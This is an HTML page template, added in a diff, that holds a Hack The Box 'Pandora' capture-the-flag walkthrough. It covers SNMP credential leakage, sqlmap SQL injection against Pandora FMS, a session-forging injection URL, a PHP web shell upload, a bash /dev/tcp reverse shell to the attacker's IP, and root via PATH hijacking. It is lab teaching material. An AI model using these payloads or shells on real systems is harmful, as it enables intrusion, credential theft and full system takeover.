@@ -1,0 +1,308 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}"> 
+</head>
+<body>
+    <h1 class="title">HTB Pandora</h1>
+    <p class="text">Easy : User Difficulty 4.6</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ cat <u>sudo nmap -p- -sCV &lt;target_ip&gt; --min-rate=2000</u>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
+|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
+|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Play | Landing
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+
+<p class="text">Port 80 for http is open on the target machine. </p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/pandora/1-page.png' %}" alt="">
+    <p class="text">However, there is no interesting information. This looks like just a webpage and not exploitable. Additionally, even though I enumerated directories with gobuster and subdomains with ffuf, there is no additional information. There would be another way to step up.</p>
+</div>
+
+<p class="text">Sometimes, it occur that we ignore essential open udp port, so let's back to nmap and enumerate udp ports.</p>
+
+<div class="code-box"><pre><code>└─$ <u>sudo nmap -sU -top-ports=100 &lt;target_ip&gt;</u>
+PORT    STATE         SERVICE
+68/udp  open|filtered dhcpc
+161/udp open          snmp</code></pre></div>
+
+<p class="text">Port 161, snmp is open.</p>
+
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">SNMP (Simple Network Management Protocol) monitors/manages network devices (routers, switches, printers). Uses OIDs to read/write device data. Ports UDP 161/162. Versions v1/v2c (insecure), v3 (secure). Risk: default community strings.</p>
+<p class="text">Use SNMP to enumerate device info (snmpwalk) and find credentials/config via default or weak community strings (v1/v2c). If write access exists, modify configs (e.g., change TFTP/boot params) or retrieve secrets. Prioritize detection/audit over destructive actions.</p>
+<p class="text">Let's do this.</p>
+
+<div class="code-box"><pre><code>└─$ <u>snmpwalk -v 1 -c public &lt;target_ip&gt;</u>
+<u class="green">SNIP....</u>
+iso.3.6.1.2.1.25.4.2.1.5.959 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
+<u class="green">...SNIP</u></code></pre></div>
+
+<p class="text">You can get connection with credentail <u>daniel : HotelBabylon23</u></p>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+<div class="code-box"><pre><code>└─$ ssh daniel@&lt;target_p&gt;
+daniel@pandora:~$ cd /var/www
+daniel@pandora:/var/www$ ls
+html  pandora</code></pre></div>
+
+<p class="text">On the /var/www, there is a subdomain we couldn't find with ffuf. We might be able to use this for lateral movement.</p>
+<p class="text">Because the port it opened with apache, we can find which port is used for pandora domain.</p>
+<div class="code-box"><pre><code>daniel@pandora:/var/www$ cat /etc/apache2/sites-enabled/pandora.conf
+&lt;VirtualHost <u>localhost:80</u>>
+  ServerAdmin admin@panda.htb
+  ServerName pandora.panda.htb
+  DocumentRoot /var/www/pandora
+  AssignUserID matt matt
+  &lt;Directory /var/www/pandora>
+    AllowOverride All
+  &lt;/Directory>
+  ErrorLog /var/log/apache2/error.log
+  CustomLog /var/log/apache2/access.log combined
+&lt;/VirtualHost></code></pre></div>
+
+
+
+<p class="text">We found out localhost:80 is used for pandora. Let's access there via port forwarding.</p>
+
+<div class="code-box"><pre><code>└─$ ssh daniel@10.129.162.214 -L 9001:localhost:80</code></pre></div>
+
+<p class="text">You can access to pandora with http://127.0.0.1:9001</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/pandora/2-pandora.png' %}" alt="">
+    <p class="text">This subdomain uses PANDORA FMS varsion7.0NG.742_FIX_PERL2020. With a little research on google, it revealed there is a SQL injection vulnerability on /include/chart_generator.php. It says there is no sanitization for session_id request. We can try it and check if we can read databases.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$ sqlmap 'http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=' --batch
+...
+[06:20:14] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
+web application technology: PHP, Apache 2.4.41
+...</code></pre></div>
+
+<p class="text">We made sure the page is vulnerable to SQLInjection. Let's keep digging.</p>
+
+<div class="code-box"><pre><code>└─$ sqlmap 'http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=' --batch -dbs
+[06:21:34] [INFO] fetching database names
+[06:21:34] [INFO] resumed: 'information_schema'
+[06:21:34] [INFO] resumed: 'pandora'</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ sqlmap 'http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=' --batch -D pandora -tables
+...snip
+
+| <u>tpassword_history</u>                  |
+| tperfil                            |
+| tphase                             |
+...snip
+| treset_pass                        |
+| treset_pass_history                |
+| tserver                            |
+| tserver_export                     |
+| tserver_export_data                |
+| tservice                           |
+| tservice_element                   |
+| tsesion                            |
+| tsesion_extended                   |
+| <p>tsessions_php</p>                      |
+...snip
++------------------------------------+</code></pre></div>
+
+
+<p class="text">It returned 178 tables, but we can filter interesting tables 'tpassword_history' and 'tsessions_php'. Let's read the most interesting table 'passowrd history'.</p>
+
+<div class="code-box"><pre><code>└─$ sqlmap 'http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=' --batch -D pandora -T tpassword_history --dump 
++---------+---------+---------------------+----------------------------------+---------------------+
+| id_pass | id_user | date_end            | password                         | date_begin          |
++---------+---------+---------------------+----------------------------------+---------------------+
+| 1       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 |
+| 2       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 |
++---------+---------+---------------------+----------------------------------+---------------------+</code></pre></div>
+
+
+<p class="text">We got hashed password for matt. However, we cannot decode this hash easily. Also, crackstation cannot crack this. So, we have to find other interesting information. </p>
+<p class="text">Do you remember that the parameter that we used for SQLInjection was session_id? Having control of session_id parameter can mean we can use other cookies for login. So, let's read tsessions_php table.</p>
+
+
+
+<div class="code-box"><pre><code>└─$ sqlmap 'http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=' --batch -D pandora -T tsessions_php --dump
++----------------------------+-------------------------------+-------------+
+| id_session                 | data                          | last_active |
++----------------------------+-------------------------------+-------------+
+| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";      | 1638783555  |
+| 0ahul7feb1l9db7ffp8d25sjba | NULL                          | 1638789018  |
+| 1um23if7s531kqf5da14kf5lvm | NULL                          | 1638792211  |
+| 2e25c62vc3odbppmg6pjbf9bum | NULL                          | 1638786129  |
+| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";      | 1638540332  |
+| 3me2jjab4atfa5f8106iklh4fc | NULL                          | 1638795380  |
+| 4f51mju7kcuonuqor3876n8o02 | NULL                          | 1638786842  |
+| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";      | 1638535373  |
+| 59qae699l0971h13qmbpqahlls | NULL                          | 1638787305  |
+| 5fihkihbip2jioll1a8mcsmp6j | NULL                          | 1638792685  |
+| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";      | 1638281946  |
+| 5lk6dlfn5cso9ss45bq5iq9h1n | NULL                          | 1758873779  |
+| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";      | 1641195617  |
+| 6aonpocboss215gnrul1hng83k | id_usuario|s:6:"daniel";      | 1758873241  |
+| 7tcncblgaqkkuiiq5bnq1dlkhh | NULL                          | 1758873104  |
+| 81f3uet7p3esgiq02d4cjj48rc | NULL                          | 1623957150  |
+| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";      | 1638446321  |
+| 8upeameujo9nhki3ps0fu32cgd | NULL                          | 1638787267  |
+| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";      | 1638881787  |
+| a3a49kc938u7od6e6mlip1ej80 | NULL                          | 1638795315  |
+| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";      | 1638881664  |
+| ah1dhb3fi0s4qlbddn984jsa2r | NULL                          | 1758873290  |
+| bbhf4mtod74tqhv50mpdvu4lj5 | id_usuario|s:6:"daniel";      | 1641201982  |
+| cojb6rgubs18ipb35b3f6hf0vp | NULL                          | 1638787213  |
+| d0carbrks2lvmb90ergj7jv6po | NULL                          | 1638786277  |
+| dea61sc8n76jm4nk29uo4l2u97 | NULL                          | 1758874060  |
+| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";      | 1641200284  |
+| f9idri3gqkcklnuar2243lcc12 | NULL                          | 1758873042  |
+| fikt9p6i78no7aofn74rr71m85 | NULL                          | 1638786504  |
+| fqd96rcv4ecuqs409n5qsleufi | NULL                          | 1638786762  |
+| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";      | 1638783230  |
+| <u>g4e01qdgk36mfdh90hvcc54umq</u> | alert_msg|a:0:{}new_chat|b:0; | 1758873950  |
+| gf40pukfdinc63nm5lkroidde6 | NULL                          | 1638786349  |
+| heasjj8c48ikjlvsf1uhonfesv | NULL                          | 1638540345  |
+| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";      | 1638168492  |
+| j781p0fg12lfbh9inrerohpq2p | NULL                          | 1758873378  |
+| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";      | 1638456173  |
+| jp5e5kci6rlkufk91oef1h2rg3 | id_usuario|s:6:"daniel";      | 1758868966  |
+| kp90bu1mlclbaenaljem590ik3 | NULL                          | 1638787808  |
+| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                          | 1638796348  |
+| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";      | 1638540482  |
+| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";      | 1637667827  |
+| oonh7e8hsmtiun7orvrf51lb8n | NULL                          | 1758873508  |
+| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";      | 1638168416  |
+| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                          | 1638787723  |
+| r097jr6k9s7k166vkvaj17na1u | NULL                          | 1638787677  |
+| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";      | 1638889082  |
+| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";      | 1638547193  |
+| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";      | 1638793297  |
++----------------------------+-------------------------------+-------------+</code></pre></div>
+
+
+<p class="text">This table also has many data, but there is an only one session_id which doesn't belong to daniel. We might use it for login.</p>
+
+<p class="text">Navigating to http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq makes you able to get dashborad page.</p>
+
+<p class="text">Actually you can get admin cookie with this url <u>http://localhost/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271</u> according to <a href="https://github.com/akr3ch/CVE-2021-32099">this</a> poc.</p>
+<p class="text">After upgrading to admin user, you can upload new file from admin tools > file manager. You can simply upload the file with the code...</p>
+<div class="code-box"><pre><code>&lt;?php system($_REQUEST['cmd']); ?> <u class="green">#name it rev.php(whatever you want)</u></code></pre></div>
+
+<p class="text">Then, you have access to the user daniel, so you can find file location where the file we uploaded is stored.</p>
+
+<div class="code-box"><pre><code>daniel@pandora:/var/www$ find . -name rev.php
+./pandora/pandora_console/images/rev.php</code></pre></div>
+
+<p class="text">You can get reverse shell with...</p>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+└─$ curl 'http://127.0.0.1:9001/pandora_console/images/rev.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/&lt;your_ip&gt;/4444+0>%261"'</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.32] from (UNKNOWN) [10.129.162.214] 36356
+bash: cannot set terminal process group (1038): Inappropriate ioctl for device
+bash: no job control in this shell
+matt@pandora:/var/www/pandora/pandora_console/images$ id
+uid=1000(matt) gid=1000(matt) groups=1000(matt)</code></pre></div>
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<p class="text">Before we check if there is executables for PrivEsc, let's establish ssh with the user matt.</p>
+<p class="text">There is no .ssh directory in /home/matt, we can create it.</p>
+
+<div class="code-box"><pre><code>matt@pandora:/home/matt$ mkdir .ssh <u class="green">#on the target machine</u>
+└─$ ssh-keygen -t ed25519 -C "username@hostname" <u class="green">#kali@kali in my case.</u>
+<u class="green">#copy created file content and paste to ...</u>
+matt@pandora:/home/matt/.ssh$ echo '&lt;output&gt;' > authorized_keys</code></pre></div>
+
+<p class="text">You can establish connection with matt in ssh.</p>
+<div class="code-box"><pre><code>└─$ ssh -i ~/keys/ed25519_gen matt@10.129.162.214</code></pre></div>
+
+<p class="text">The command 'sudo -l' requires user password, so we cannot see if there are any commands as sudoer. So we have to find another vector for PrivEsc. Let's start from executables.</p>
+
+
+<div class="code-box"><pre><code>matt@pandora:~$ find / -perm -4000 2>/dev/null
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/umount
+<u>/usr/bin/pandora_backup</u>
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1</code></pre></div>
+
+<p class="text">There is interesting executable file named 'pandora_backup'. Let's analyze this.</p>
+
+
+<div class="code-box"><pre><code>matt@pandora:~$ ltrace pandora_backup getuid()                                         = 1000
+geteuid()                                        = 1000
+setreuid(1000, 1000)                             = 0
+puts("PandoraFMS Backup Utility"PandoraFMS Backup Utility
+)                = 26
+puts("Now attempting to backup Pandora"...Now attempting to backup PandoraFMS client
+)      = 43
+system("<u>tar -cvf /root/.backup/pandora-b"...tar</u>: <u>/root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied</u>
+tar: Error is not recoverable: exiting now
+ &lt;no return ...>
+--- SIGCHLD (Child exited) ---
+&lt;... system resumed> )                           = 512
+puts("Backup failed!\nCheck your permis"...Backup failed!
+Check your permissions!
+)     = 39
++++ exited (status 1) +++</code></pre></div>
+
+
+<p class="text">Look at the line underlined in red. This line calls tar command without <u>FULL PATH</u>. Also, we can see the stem of the error is openning root file without privilege. Therefore, if we could use our arbitrary file named 'tar', we can generate root bash.</p>
+<p class="text"><u>$PATH-hijack</u> takes advantage of this situation. Let's exploit!</p>
+
+
+
+
+<div class="code-box"><pre><code>matt@pandora:~$ export PATH=/dev/shm:$PATH <u class="green">#Create new $PATH</u>
+matt@pandora:~$ echo $PATH
+<u>/dev/shm:</u>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+matt@pandora:~$ cd /dev/shm
+matt@pandora:/dev/shm$ nano tar
+<u class="green">#!/bin/bash
+bash</u>
+matt@pandora:/dev/shm$ chmod +x tar
+matt@pandora:/dev/shm$ ls
+multipath  tar
+matt@pandora:/dev/shm$ /usr/bin/pandora_backup
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+root@pandora:/dev/shm# id                       <u class="green">#the command tar is executed with our tar file.</u>
+uid=0(root) gid=1000(matt) groups=1000(matt)</code></pre></div>
+
+
+<p class="text">We got root bash. You can find root flag in /root/root.txt</p>
+
+
+</body>
+</html>
